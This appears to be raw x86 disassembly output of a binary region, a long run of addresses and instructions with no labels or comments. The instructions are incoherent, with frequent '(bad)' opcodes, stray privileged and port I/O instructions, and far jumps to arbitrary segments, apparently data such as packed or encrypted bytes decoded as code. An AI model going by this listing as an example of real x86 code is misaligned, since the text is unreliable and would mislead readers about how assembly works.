  4161a5:	jnp    0x416130
  4161a7:	pop    esp
  4161a8:	cld    
  4161a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4161aa:	popf   
  4161ab:	out    dx,al
  4161ac:	call   0x1b3319a1
  4161b1:	aaa    
  4161b2:	sbb    ecx,DWORD PTR [ebx-0x31c865d7]
  4161b8:	and    bl,BYTE PTR [edx-0xc2f90cd]
  4161be:	mov    ebp,0xb215905b
  4161c3:	xchg   BYTE PTR [ebp+0x8],cl
  4161c6:	ss sub eax,0xf27ce214
  4161cc:	pop    esi
  4161cd:	fcomp  QWORD PTR [ebx-0x114b9096]
  4161d3:	push   edx
  4161d4:	pop    eax
  4161d5:	mov    ah,0xd8
  4161d7:	or     edi,edi
  4161d9:	mov    esp,0x13573f7c
  4161de:	xor    bh,BYTE PTR [ebx]
  4161e0:	repnz mov dh,0x67
  4161e3:	cwde   
  4161e4:	ficom  WORD PTR [ecx+0x69bebe95]
  4161ea:	retf   0x404d
  4161ed:	int    0xff
  4161ef:	test   BYTE PTR [eax-0xdd7a593],0x50
  4161f6:	and    BYTE PTR [esi-0x29],dh
  4161f9:	sub    esi,DWORD PTR [ebx]
  4161fb:	mov    al,ds:0xc62d6080
  416200:	inc    ebp
  416201:	fist   DWORD PTR [ebx]
  416203:	and    eax,0x96005be6
  416208:	test   al,0xf7
  41620a:	jb     0x41623e
  41620c:	push   0x53
  41620e:	sti    
  41620f:	aam    0xf9
  416211:	scas   eax,DWORD PTR es:[edi]
  416212:	sbb    dl,BYTE PTR [esi+esi*1-0x47]
  416216:	pop    eax
  416217:	ret    
  416218:	cmp    bl,BYTE PTR [edi+0x48647a44]
  41621e:	out    0xb2,al
  416220:	das    
  416221:	xchg   esi,eax
  416222:	bound  esp,QWORD PTR [esi-0x4b]
  416225:	div    bl
  416227:	mov    dh,0xc4
  416229:	jp     0x4161e4
  41622b:	ffreep st(0)
  41622d:	mov    cl,0xc2
  41622f:	ja     0x41620d
  416231:	(bad)  
  416233:	add    DWORD PTR [edi-0x2ae2badb],edx
  416239:	pop    ecx
  41623a:	sub    BYTE PTR [ecx],al
  41623c:	(bad)  
  41623d:	and    eax,0x19346f25
  416242:	ror    DWORD PTR [esp+eax*2+0x49],cl
  416246:	add    DWORD PTR [ebx+0x35],esi
  416249:	vmaxps ymm1,ymm4,YMMWORD PTR [eax+0x60]
  41624e:	sub    edi,DWORD PTR [ebp+0x59bf2e9e]
  416254:	int    0xf0
  416256:	aaa    
  416257:	bswap  ecx
  416259:	hlt    
  41625a:	ficom  DWORD PTR [ebp+0x5]
  41625d:	adc    bl,bh
  41625f:	jnp    0x4161e1
  416261:	or     ecx,DWORD PTR [edx+0x3f]
  416264:	or     BYTE PTR [ebp-0x62],dl
  416267:	call   0x16a569a2
  41626c:	pop    edx
  41626d:	mov    ecx,0x32cc9d09
  416272:	shr    BYTE PTR [eax-0x21f819d1],cl
  416278:	mov    al,ds:0x15d0aca8
  41627d:	aad    0xf
  41627f:	xor    DWORD PTR fs:[eax],eax
  416282:	mov    edi,0x91f67f5
  416287:	cmp    esp,esp
  416289:	push   ecx
  41628a:	sub    DWORD PTR [esi+0x4f6ce2c7],ecx
  416290:	popf   
	...
  4162f1:	add    BYTE PTR [eax],al
  4162f3:	add    BYTE PTR [ebx],ah
  4162f5:	outs   dx,BYTE PTR ds:[esi]
  4162f6:	xor    ah,BYTE PTR ds:0x6e377d7f
  4162fc:	mov    bl,0x5f
  4162fe:	call   0x5411:0xf163e3ee
  416305:	jmp    0x0:0x1050000
  41630c:	and    eax,0x2fa7048e
  416311:	jmp    0x2dc30147
  416316:	outs   dx,BYTE PTR ds:[esi]
  416317:	sbb    eax,0x32e8673a
  41631c:	(bad)  
  41631d:	sbb    ecx,DWORD PTR [edx-0x3b]
  416320:	fsubr  QWORD PTR [eax]
  416322:	add    BYTE PTR [esi-0x8],dl
  416325:	leave  
  416326:	push   ebp
  416327:	or     al,0x52
  416329:	aaa    
  41632a:	cs inc eax
  41632c:	xor    eax,0x2b31cddd
  416331:	push   esp
  416332:	jmp    0xb212:0x61f50729
  416339:	fs (bad) 
  41633c:	ins    DWORD PTR es:[edi],dx
  41633d:	jae    0x4162ff
  41633f:	in     al,dx
  416340:	shr    BYTE PTR [esi-0x7e],cl
  416343:	push   ebx
  416344:	popf   
  416345:	sub    eax,0xe7469a30
  41634a:	sub    DWORD PTR [esi+0x8],ebp
  41634d:	sub    bl,BYTE PTR [ecx+0x6c21b3a8]
  416353:	dec    edx
  416354:	jp     0x416372
  416356:	sar    BYTE PTR [edx+0x66bb5f13],0x28
  41635d:	je     0x416390
  41635f:	js     0x41630a
  416361:	imul   ecx,eax,0xd700f0f5
  416367:	fwait
  416368:	retf   0x4624
  41636b:	ins    BYTE PTR es:[edi],dx
  41636c:	xor    BYTE PTR [edx+edx*8+0x6f7fef0],al
  416373:	inc    BYTE PTR [ecx]
  416375:	jecxz  0x41636a
  416377:	je     0x416380
  416379:	cmp    eax,0xe1821fe9
  41637e:	(bad)  
  41637f:	xor    ebx,edx
  416381:	fsub   DWORD PTR [edx]
  416383:	xchg   esp,eax
  416384:	scas   al,BYTE PTR es:[edi]
  416385:	fdivr  QWORD PTR [ebp+0x240cdf45]
  41638b:	pop    edi
  41638c:	jne    0x416406
  41638e:	xchg   esp,eax
  41638f:	push   esi
  416390:	xlat   BYTE PTR ds:[ebx]
  416391:	or     al,0xf5
  416393:	jmp    0x720e:0xfcab358b
  41639a:	into   
  41639b:	sub    eax,0xf86548b8
  4163a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163a1:	dec    eax
  4163a2:	xchg   esp,eax
  4163a3:	dec    esp
  4163a4:	jmp    0x2ad00832
  4163a9:	pop    es
  4163aa:	mov    ebx,0xef8742f4
  4163af:	jmp    0x72a8a4bc
  4163b4:	bound  edx,QWORD PTR [ebp-0x1b]
  4163b7:	es push ds
  4163b9:	ja     0x416387
  4163bb:	xor    dh,ch
  4163bd:	jmp    0x41641b
  4163bf:	ja     0x41641a
  4163c1:	mov    gs,WORD PTR [ebx-0x6]
  4163c4:	shl    DWORD PTR [ecx],cl
  4163c6:	mov    dl,0xb4
  4163c8:	iret   
  4163c9:	in     al,0xf5
  4163cb:	ja     0x4163a1
  4163cd:	js     0x41644e
  4163cf:	leave  
  4163d0:	hlt    
  4163d1:	mov    al,ds:0x31224cca
  4163d6:	pushf  
  4163d7:	fidiv  WORD PTR fs:[edi]
  4163da:	cmp    BYTE PTR [ecx-0xde5f5d7],bh
  4163e0:	mov    DWORD PTR [esi],edi
  4163e2:	mov    WORD PTR [ebp+ecx*2-0x28],?
  4163e6:	stc    
  4163e7:	push   edi
  4163e8:	cs push ss
  4163ea:	dec    esi
  4163eb:	mov    cl,0x92
  4163ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163ee:	cmp    al,0x31
  4163f0:	cdq    
  4163f1:	mov    ch,cl
  4163f3:	rcr    DWORD PTR [ebp-0x4f],1
  4163f6:	add    esp,edx
  4163f8:	pop    ecx
  4163f9:	sar    ch,1
  4163fb:	jp     0x4163f8
  4163fd:	mov    edx,0xac151dfc
  416402:	sbb    dh,BYTE PTR [edx]
  416404:	das    
  416405:	adc    bh,BYTE PTR [ebx-0x72]
  416408:	adc    edi,DWORD PTR [esi+edi*8+0x684cbfc]
  41640f:	or     DWORD PTR [ebx],ecx
	...
  416471:	add    BYTE PTR [eax],al
  416473:	add    bl,dh
  416475:	inc    ebx
  416476:	ror    cl,1
  416478:	lock (bad) 
  41647b:	jnp    0x41640b
  41647d:	xor    al,0x5a
  41647f:	xchg   esi,eax
  416480:	pop    es
  416481:	sbb    BYTE PTR [eax+0xeb5987],bh
  416487:	add    BYTE PTR ds:0x79000001,al
  41648d:	aam    0x1a
  41648f:	xchg   ebp,eax
  416490:	in     al,0xfb
  416492:	mov    dl,BYTE PTR [ebx*1-0x202bdfe0]
  416499:	fisubr WORD PTR [ebx+0x186fa752]
  41649f:	push   esp
  4164a0:	jp     0x4164f3
  4164a2:	stos   DWORD PTR es:[edi],eax
  4164a3:	sbb    al,0xb1
  4164a5:	enter  0xeb0b,0xa0
  4164a9:	cwde   
  4164aa:	outs   dx,BYTE PTR ds:[esi]
  4164ab:	test   DWORD PTR ds:0xb74a9fb6,eax
  4164b1:	sbb    eax,0xf4e33878
  4164b6:	icebp  
  4164b7:	les    ecx,FWORD PTR [edx]
  4164b9:	out    dx,eax
  4164ba:	call   0xacb:0xc86356fd
  4164c1:	and    BYTE PTR [edi-0x1c],0x16
  4164c5:	out    0xe4,eax
  4164c7:	add    eax,0xcea8098a
  4164cc:	dec    ecx
  4164cd:	leave  
  4164ce:	pop    esp
  4164cf:	fwait
  4164d0:	inc    ebx
  4164d1:	sti    
  4164d2:	and    DWORD PTR [ecx],0xffffffdd
  4164d5:	imul   edx,DWORD PTR [edi],0x39f39415
  4164db:	and    edi,DWORD PTR [ecx+0x60528c62]
  4164e1:	xor    eax,0x93b07217
  4164e6:	xchg   edi,eax
  4164e7:	jae    0x416516
  4164e9:	mov    edi,0x778d1cda
  4164ee:	push   0xfffffffa
  4164f0:	inc    esp
  4164f1:	inc    esp
  4164f2:	pop    edi
  4164f3:	std    
  4164f4:	push   ebx
  4164f5:	popf   
  4164f6:	pushf  
  4164f7:	xsha1  (bad)
  4164f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164f9:	retf   
  4164fa:	cdq    
  4164fb:	outs   dx,BYTE PTR ds:[esi]
  4164fc:	mov    ecx,DWORD PTR [edx+0x21]
  4164ff:	pop    ds
  416500:	in     al,0xba
  416502:	dec    esp
  416503:	inc    esp
  416504:	mov    ebx,0x9d03ffe7
  416509:	jb     0x416538
  41650b:	cwde   
  41650c:	jge    0x416539
  41650e:	mov    ebp,0x3ba63969
  416513:	push   eax
  416514:	jbe    0x416572
  416516:	sti    
  416517:	and    al,0x2f
  416519:	pop    ebx
  41651a:	(bad)  
  41651b:	push   edi
  41651c:	ins    BYTE PTR es:[edi],dx
  41651d:	and    eax,0x12183b0e
  416522:	les    esp,FWORD PTR [eax+0x7a105bde]
  416528:	or     esp,DWORD PTR [edx+edi*8+0x7cc5a501]
  41652f:	jmp    0x84b4:0x88de8754
  416536:	(bad)  
  416537:	pop    ebx
  416538:	neg    eax
  41653a:	push   edx
  41653b:	pop    ss
  41653c:	out    0x65,eax
  41653e:	imul   ebp,DWORD PTR [ecx],0xc7149f0d
  416544:	into   
  416545:	mov    ebx,0x895b4936
  41654a:	not    DWORD PTR [eax]
  41654c:	call   0xd6ed2f8e
  416551:	outs   dx,DWORD PTR ds:[esi]
  416552:	jnp    0x416544
  416554:	jecxz  0x4165a8
  416556:	xor    edx,DWORD PTR [ecx-0x6e]
  416559:	pop    edx
  41655a:	outs   dx,DWORD PTR ds:[esi]
  41655b:	inc    edx
  41655c:	inc    edx
  41655d:	scas   eax,DWORD PTR es:[edi]
  41655e:	push   0xffffff9a
  416560:	lahf   
  416561:	xor    ecx,eax
  416563:	(bad)
  416568:	mov    esp,0xc48dc91f
  41656d:	fist   DWORD PTR [ecx-0x220b893]
  416573:	lods   eax,DWORD PTR ds:[esi]
  416574:	outs   dx,BYTE PTR ds:[esi]
  416575:	mov    eax,ds:0x4ed08f0d
  41657a:	es push es
  41657c:	(bad)  
  41657d:	(bad)  
  41657e:	je     0x416528
  416580:	leave  
  416581:	cli    
  416582:	aad    0x8e
  416584:	mov    BYTE PTR [edi],cl
  416586:	(bad)  
  416587:	aaa    
  416588:	push   esi
  416589:	jg     0x416596
  41658b:	ins    BYTE PTR es:[edi],dx
  41658c:	mov    esp,0xb8d937a8
	...
  4165f1:	add    BYTE PTR [eax],al
  4165f3:	add    BYTE PTR ds:0xfff32bd8,ah
  4165f9:	repz std 
  4165fb:	fisub  WORD PTR [esi-0x79b04354]
  416601:	bnd ja 0x416627
  416604:	pop    esi
  416605:	in     al,dx
  416606:	add    BYTE PTR [eax],al
  416608:	add    eax,0x84000001
  41660d:	xor    dh,dh
  41660f:	adc    DWORD PTR [ebx-0x69],0xfffffff4
  416613:	das    
  416614:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416615:	jno    0x416691
  416617:	call   0x8ad0:0x70c9af9b
  41661e:	and    al,0x25
  416620:	cwde   
  416621:	pop    eax
  416622:	dec    edx
  416623:	or     DWORD PTR [edx],esi
  416625:	add    al,0xf9
  416627:	jle    0x4165ae
  416629:	jns    0x416651
  41662b:	outs   dx,DWORD PTR ds:[esi]
  41662c:	xor    BYTE PTR [ebp+0x33a12dc6],0xa5
  416633:	mov    bh,0x21
  416635:	iret   
  416636:	icebp  
  416637:	inc    esi
  416638:	and    BYTE PTR [ebx],0xc2
  41663b:	aas    
  41663c:	or     al,0xe5
  41663e:	repnz retf 0x7e0e
  416642:	ja     0x4165dd
  416644:	adc    edi,eax
  416646:	jge    0x416650
  416648:	inc    esi
  416649:	in     al,0xa1
  41664b:	pop    esi
  41664c:	mov    DWORD PTR [ecx],esi
  41664e:	sub    esp,0x561b7967
  416654:	dec    eax
  416655:	(bad)  
  416656:	lock dec ebp
  416658:	ins    BYTE PTR es:[edi],dx
  416659:	in     al,dx
  41665a:	pop    ebp
  41665b:	mov    bh,0x44
  41665d:	jae    0x4166a8
  41665f:	addr16 inc edx
  416661:	loop   0x4166d4
  416663:	test   ah,bl
  416665:	mov    bh,0xe0
  416667:	into   
  416668:	xchg   al,dl
  41666a:	retf   0xf439
  41666d:	outs   dx,DWORD PTR ds:[esi]
  41666e:	xchg   ebp,eax
  41666f:	loope  0x4166b8
  416671:	dec    ebx
  416672:	mov    ecx,0x10720766
  416677:	out    0x1a,eax
  416679:	in     al,0xb5
  41667b:	sub    ch,dh
  41667d:	fmul   st(7),st
  41667f:	adc    eax,DWORD PTR [ebp+0x57]
  416682:	cs scas eax,DWORD PTR es:[edi]
  416684:	xor    eax,0xff092adf
  416689:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41668a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41668b:	fs xchg esi,eax
  41668d:	dec    edx
  41668e:	xchg   ebp,eax
  41668f:	cmp    al,0xa5
  416691:	sub    al,0x99
  416693:	jbe    0x4166d6
  416695:	push   edi
  416696:	dec    ebp
  416697:	inc    edi
  416698:	mov    esp,0x816d7c57
  41669d:	xchg   esp,eax
  41669e:	push   eax
  41669f:	aas    
  4166a0:	xchg   DWORD PTR [edi+0x28],ebp
  4166a3:	mov    cl,0x93
  4166a5:	retf   
  4166a6:	fs call 0xa156e1f3
  4166ac:	pop    ebp
  4166ad:	sti    
  4166ae:	inc    ecx
  4166af:	test   al,0x60
  4166b1:	out    0x6b,eax
  4166b3:	sub    DWORD PTR [edi-0x63],edx
  4166b6:	sbb    ebp,esi
  4166b8:	sub    bh,bl
  4166ba:	add    bh,BYTE PTR [ebp-0x33]
  4166bd:	loop   0x416685
  4166bf:	mov    ds:0x470fa790,al
  4166c4:	sbb    bl,BYTE PTR [esi+edi*1+0x46]
  4166c8:	adc    al,0x85
  4166ca:	ins    DWORD PTR es:[edi],dx
  4166cb:	inc    ecx
  4166cc:	scas   al,BYTE PTR es:[edi]
  4166cd:	mov    ah,0xb9
  4166cf:	pop    ebp
  4166d0:	push   ebx
  4166d1:	sub    eax,0x2c85c5df
  4166d6:	pop    edx
  4166d7:	loop   0x4166a3
  4166d9:	fnstcw WORD PTR [ecx]
  4166db:	aas    
  4166dc:	pop    eax
  4166dd:	data16 int 0xec
  4166e0:	add    al,0x99
  4166e2:	jg     0x416665
  4166e4:	inc    esp
  4166e5:	mov    ebx,0x2c21cc39
  4166ea:	aaa    
  4166eb:	sub    eax,0x45367eb3
  4166f0:	out    dx,eax
  4166f1:	test   eax,0x56232194
  4166f6:	movhps xmm0,QWORD PTR [ebp-0x485250a5]
  4166fd:	inc    eax
  4166fe:	adc    al,0x2
  416700:	scas   eax,DWORD PTR es:[edi]
  416701:	push   eax
  416702:	push   es
  416703:	xchg   esi,eax
  416704:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416705:	test   DWORD PTR [ecx-0x2a],ebx
  416708:	shr    edi,cl
  41670a:	add    eax,0xf36ff828
  41670f:	lods   al,BYTE PTR ds:[esi]
  416710:	add    al,0x0
	...
  416772:	add    BYTE PTR [eax],al
  416774:	(bad)  
  416775:	(bad)  
  416777:	(bad)  
  416778:	(bad)  
  41677a:	out    0xff,eax
  41677c:	sbb    edi,DWORD PTR [esp+ecx*2-0x3a]
  416780:	aas    
  416781:	imul   esi,ebx,0xffffff8c
  416784:	arpl   bp,bp
  416786:	add    BYTE PTR [eax],al
  416788:	add    eax,0xb8000001
  41678d:	(bad)
  416790:	pusha  
  416791:	ret    0x5819
  416794:	retf   0x210c
  416797:	hlt    
  416798:	pop    eax
  416799:	cmp    al,0xfc
  41679b:	xchg   edx,eax
  41679c:	lods   al,BYTE PTR ds:[esi]
  41679d:	or     bh,dh
  41679f:	lea    ebx,[ebp+0x1eafd325]
  4167a5:	(bad)  
  4167a6:	xlat   BYTE PTR ds:[ebx]
  4167a7:	les    edx,FWORD PTR [ebx]
  4167a9:	sub    eax,0x3c0c8450
  4167ae:	add    edx,DWORD PTR [edx-0x4bae4e18]
  4167b4:	push   ds
  4167b5:	and    eax,0x1673ed14
  4167ba:	ds in  eax,0x8e
  4167bd:	xchg   BYTE PTR [edx-0x4d4aae05],bh
  4167c3:	pop    ss
  4167c4:	call   0x2e505e9c
  4167c9:	fiadd  DWORD PTR [esi]
  4167cb:	(bad)  
  4167cc:	repz push esp
  4167ce:	sbb    BYTE PTR gs:[edx],ah
  4167d1:	push   ds
  4167d2:	mov    ah,BYTE PTR [esi+0x54]
  4167d5:	les    esi,FWORD PTR [edi-0x6c]
  4167d8:	pop    edi
  4167d9:	jl     0x4167db
  4167db:	das    
  4167dc:	mov    cl,0x1b
  4167de:	push   eax
  4167df:	into   
  4167e0:	fldcw  WORD PTR [ecx+0x7b]
  4167e3:	test   DWORD PTR [esi+0x54],eax
  4167e6:	mov    cl,0xca
  4167e8:	ins    BYTE PTR es:[edi],dx
  4167e9:	cwde   
  4167ea:	fwait
  4167eb:	push   ecx
  4167ec:	pop    eax
  4167ed:	(bad)  
  4167ee:	mov    cs,WORD PTR [ecx+eax*4]
  4167f1:	loop   0x41681a
  4167f3:	arpl   dx,sp
  4167f5:	std    
  4167f6:	inc    esi
  4167f7:	popf   
  4167f8:	mov    edi,0xd7116d68
  4167fd:	push   cs
  4167fe:	mov    ds:0x9ee6a42,al
  416803:	popa   
  416804:	mov    WORD PTR [eax],ds
  416806:	test   DWORD PTR [edx+0x4b],edx
  416809:	fiadd  DWORD PTR [ecx+0x78b01b81]
  41680f:	fsubr  QWORD PTR [esi-0x146fed15]
  416815:	push   es
  416816:	dec    DWORD PTR [edx]
  416818:	dec    eax
  416819:	inc    ebp
  41681a:	and    DWORD PTR cs:[ebx+0x1b],esp
  41681e:	push   esp
  41681f:	es push 0xffffffc3
  416822:	lods   al,BYTE PTR ds:[esi]
  416823:	(bad)  
  416824:	dec    eax
  416825:	jns    0x416811
  416827:	xor    ah,BYTE PTR [ecx-0x9]
  41682a:	push   0x2b
  41682c:	cwde   
  41682d:	push   eax
  41682e:	fcomp  st(7)
  416830:	ins    BYTE PTR es:[edi],dx
  416831:	ins    BYTE PTR es:[edi],dx
  416832:	lods   al,BYTE PTR ds:[esi]
  416833:	pop    ecx
  416834:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416835:	jns    0x4167f7
  416837:	lahf   
  416838:	jecxz  0x41683b
  41683a:	cld    
  41683b:	inc    ebx
  41683c:	jbe    0x416830
  41683e:	(bad)  
  41683f:	leave  
  416840:	or     eax,0xe7833d4d
  416845:	inc    edi
  416846:	xchg   edx,eax
  416847:	inc    edi
  416848:	std    
  416849:	pop    esp
  41684a:	pop    ebp
  41684b:	jecxz  0x4168ae
  41684d:	jae    0x416803
  41684f:	rcl    DWORD PTR [edi],1
  416851:	stos   DWORD PTR es:[edi],eax
  416852:	pop    ebx
  416853:	mov    bl,0x69
  416855:	push   esi
  416856:	ret    0x1efa
  416859:	mov    edi,0x242295d0
  41685e:	push   edx
  41685f:	or     DWORD PTR [edx],0x8f91966e
  416865:	into   
  416866:	inc    ecx
  416867:	clc    
  416868:	bound  ecx,QWORD PTR [esi+0x34]
  41686b:	stc    
  41686c:	cld    
  41686d:	lock mov cl,0xae
  416870:	and    al,0xe2
  416872:	sub    eax,0xcbaba6f5
  416877:	push   ebx
  416878:	ins    BYTE PTR es:[edi],dx
  416879:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41687a:	push   ebx
  41687b:	loope  0x41688a
  41687d:	adc    esi,DWORD PTR [ebx+0x20a93639]
  416883:	call   0x312eb924
  416888:	shr    BYTE PTR [eax],0xde
  41688b:	xchg   ebx,eax
  41688c:	jmp    0x416884
  41688e:	leave  
  41688f:	icebp  
  416890:	inc    ecx
	...
  4168f1:	add    BYTE PTR [eax],al
  4168f3:	add    cl,dl
  4168f5:	scas   eax,DWORD PTR es:[edi]
  4168f6:	push   es
  4168f7:	repz jle 0x4168f5
  4168fa:	cmc    
  4168fb:	scas   eax,DWORD PTR es:[edi]
  4168fc:	sub    DWORD PTR [edi-0x5d],edi
  4168ff:	mov    ebp,0xbe99ec94
  416904:	push   0x50000ee
  416909:	add    DWORD PTR [eax],eax
  41690b:	add    ch,bl
  41690d:	dec    eax
  41690e:	stc    
  41690f:	nop
  416910:	loop   0x416952
  416912:	jo     0x4168f0
  416914:	xor    al,0x41
  416916:	(bad)  
  416917:	cdq    
  416918:	sub    dl,0x9c
  41691b:	or     al,0xbc
  41691d:	jge    0x4168f5
  41691f:	rcl    BYTE PTR [edi+0x33],1
  416922:	in     eax,dx
  416923:	mov    ah,bh
  416925:	cmp    eax,0x51dfb122
  41692a:	mov    ch,0xdf
  41692c:	fnstsw WORD PTR [edx+0x22]
  41692f:	retf   0x2608
  416932:	add    bl,BYTE PTR [ebx]
  416934:	mov    ebp,0xd1704547
  416939:	les    ebx,FWORD PTR [eax]
  41693b:	mov    BYTE PTR [ebx],bl
  41693d:	xchg   ebp,eax
  41693e:	or     cl,ch
  416940:	cmp    al,0xfe
  416942:	mov    ch,0xa5
  416944:	ss inc esp
  416946:	fstp   TBYTE PTR [ebp-0x5a]
  416949:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41694a:	mov    edx,0xaa5b2b60
  41694f:	xchg   ebp,eax
  416950:	push   ebp
  416951:	aaa    
  416952:	dec    esi
  416953:	lock jns 0x4169ac
  416956:	push   cs
  416957:	cwde   
  416958:	cmp    DWORD PTR [edx],edx
  41695a:	dec    esp
  41695b:	jmp    0x8e43:0xdbfe6272
  416962:	push   ds
  416963:	inc    esp
  416964:	sub    al,0xd1
  416966:	int3   
  416967:	xchg   ecx,eax
  416968:	fcomp  st(2)
  41696a:	(bad)  
  41696b:	fcmove st,st(4)
  41696d:	int    0xea
  41696f:	pusha  
  416970:	popf   
  416971:	xor    ch,BYTE PTR [edi-0x59]
  416974:	lock xacquire not DWORD PTR [ebx+ecx*2+0x5f641923]
  41697d:	adc    al,0x40
  41697f:	push   ss
  416980:	lea    ecx,[ecx-0x6a]
  416983:	inc    ecx
  416984:	jmp    FWORD PTR [ebx+0x3b]
  416987:	add    edi,DWORD PTR [ecx-0x467f9d41]
  41698d:	jp     0x416990
  41698f:	mov    ds:0xe0b389ae,al
  416994:	cmp    al,dh
  416996:	shl    DWORD PTR [ecx+edi*4+0x45],cl
  41699a:	stos   BYTE PTR es:[edi],al
  41699b:	mov    esi,0x35905b98
  4169a0:	jle    0x4169a0
  4169a2:	sbb    edx,esi
  4169a4:	sar    cl,cl
  4169a6:	pop    esi
  4169a7:	out    dx,al
  4169a8:	mov    ch,0xbd
  4169aa:	cs cli 
  4169ac:	sti    
  4169ad:	daa    
  4169ae:	mov    es:0xdff18674,eax
  4169b4:	jbe    0x416a2a
  4169b6:	test   al,0xff
  4169b8:	xchg   edi,eax
  4169b9:	xchg   edx,eax
  4169ba:	xchg   esp,eax
  4169bb:	mov    dh,0xaa
  4169bd:	xchg   esi,eax
  4169be:	stc    
  4169bf:	add    DWORD PTR [edi-0x74],esp
  4169c2:	lea    esi,[esi+0xf434045]
  4169c8:	mov    es,WORD PTR [eax+0x2ebad1a4]
  4169ce:	out    0xc2,eax
  4169d0:	iret   
  4169d1:	mov    bp,0x86b1
  4169d5:	sub    ebx,DWORD PTR ds:0xa67d85c3
  4169db:	push   0xffffffd1
  4169dd:	or     al,0xb2
  4169df:	ret    0x12f7
  4169e2:	aam    0x1
  4169e4:	inc    esp
  4169e5:	sub    DWORD PTR [edi],esi
  4169e7:	shl    DWORD PTR [ebp+ebx*2-0xf],cl
  4169eb:	mov    eax,ds:0x7b45840b
  4169f0:	xchg   esp,eax
  4169f1:	xchg   ebp,eax
  4169f2:	out    0x25,al
  4169f4:	repz clc 
  4169f6:	out    dx,eax
  4169f7:	(bad)  
  4169f8:	aas    
  4169f9:	pop    esp
  4169fa:	repz call 0x4785:0xc72399a4
  416a02:	repz jp 0x416994
  416a05:	(bad)
  416a08:	xchg   esp,eax
  416a09:	pop    edx
  416a0a:	mov    ah,0x28
  416a0c:	jnp    0x416a2a
  416a0e:	in     eax,dx
  416a0f:	xor    ch,dh
	...
  416a71:	add    BYTE PTR [eax],al
  416a73:	add    bl,cl
  416a75:	pusha  
  416a76:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416a7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a7d:	mov    al,ds:0x5c640ba3
  416a82:	clc    
  416a83:	icebp  
  416a84:	ins    DWORD PTR es:[edi],dx
  416a85:	out    dx,eax
  416a86:	add    BYTE PTR [eax],al
  416a88:	add    eax,0x74000001
  416a8d:	mov    ds:0x499cd99b,eax
  416a92:	jo     0x416a4e
  416a94:	cs aaa 
  416a96:	sar    BYTE PTR [edi-0x75],0x78
  416a9a:	dec    esi
  416a9b:	push   edi
  416a9c:	add    al,0xbe
  416a9e:	jg     0x416a9a
  416aa0:	loope  0x416ae7
  416aa2:	out    0xbe,eax
  416aa4:	add    edi,DWORD PTR [eax]
  416aa6:	mov    BYTE PTR [ecx-0x59],bl
  416aa9:	xchg   DWORD PTR [ecx+ecx*1-0xeb45ff1],edx
  416ab0:	inc    esi
  416ab1:	push   0x3e
  416ab3:	mov    dh,0x7f
  416ab5:	(bad)  
  416ab6:	jp     0x416a5f
  416ab8:	ret    0x5810
  416abb:	push   edi
  416abc:	or     BYTE PTR [ebp+0x2b258322],dh
  416ac2:	aaa    
  416ac3:	shl    BYTE PTR ds:0x80756094,0xa1
  416aca:	jl     0x416a67
  416acc:	push   ss
  416acd:	fistp  QWORD PTR [edx+eax*1]
  416ad0:	les    esp,FWORD PTR [edx+0x16]
  416ad3:	jne    0x416a66
  416ad5:	ja     0x416af8
  416ad7:	les    ebx,FWORD PTR [eax+0x51]
  416ada:	(bad)  
  416adb:	std    
  416adc:	mov    al,0xce
  416ade:	pushf  
  416adf:	scas   al,BYTE PTR es:[edi]
  416ae0:	outs   dx,DWORD PTR cs:[esi]
  416ae2:	jno    0x416b34
  416ae4:	call   0xe9401c53
  416ae9:	retf   0x585d
  416aec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416aed:	jno    0x416b11
  416aef:	add    dh,BYTE PTR [eax]
  416af1:	mov    esi,0x2943bd5e
  416af6:	mov    edx,?
  416af8:	pushf  
  416af9:	ja     0x416b74
  416afb:	mov    BYTE PTR [esi+0x632e39af],ah
  416b01:	jno    0x416b53
  416b03:	sub    edx,DWORD PTR [edi-0x296315c4]
  416b09:	xor    eax,0xd698ea25
  416b0e:	xor    edi,DWORD PTR [ebp+0x41]
  416b11:	into   
  416b12:	mov    esp,0xa58b3cd0
  416b17:	add    bh,dl
  416b19:	xlat   BYTE PTR ds:[ebx]
  416b1a:	jmp    0xeeef56a
  416b1f:	mov    DWORD PTR [edi-0x467e93ad],0xa75477f8
  416b29:	sbb    ecx,0xfffffff2
  416b2c:	xchg   ebx,eax
  416b2d:	inc    edi
  416b2e:	xchg   esp,eax
  416b2f:	pop    ebp
  416b30:	cmp    ecx,DWORD PTR [edi+0x662831b4]
  416b36:	out    0x9b,al
  416b38:	sub    BYTE PTR [ebx],ah
  416b3a:	sti    
  416b3b:	pop    ebp
  416b3c:	imul   ebx,esp,0xbfe8e0de
  416b42:	pop    eax
  416b43:	retf   0x1815
  416b46:	loop   0x416b05
  416b48:	jecxz  0x416b17
  416b4a:	lds    esp,FWORD PTR [ebx-0x58]
  416b4d:	fidivr DWORD PTR [ebx+0x21845d2a]
  416b53:	fdivr  st,st(2)
  416b55:	dec    ecx
  416b56:	pusha  
  416b57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b58:	and    al,0xdd
  416b5a:	mov    ch,0xa4
  416b5c:	push   0xffffff8d
  416b5e:	add    ebp,edi
  416b60:	xchg   esp,eax
  416b61:	mov    ds:0x72f3a26f,eax
  416b66:	pop    es
  416b67:	test   al,0x65
  416b69:	jae    0x416b6b
  416b6b:	push   ds
  416b6c:	test   BYTE PTR [edx],dl
  416b6e:	(bad)  
  416b6f:	ds push ebx
  416b71:	jl     0x416b86
  416b73:	icebp  
  416b74:	ja     0x416b32
  416b76:	xchg   ebx,eax
  416b77:	and    al,0x7d
  416b79:	jl     0x416bea
  416b7b:	(bad)  
  416b7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b7e:	aas    
  416b7f:	ins    BYTE PTR es:[edi],dx
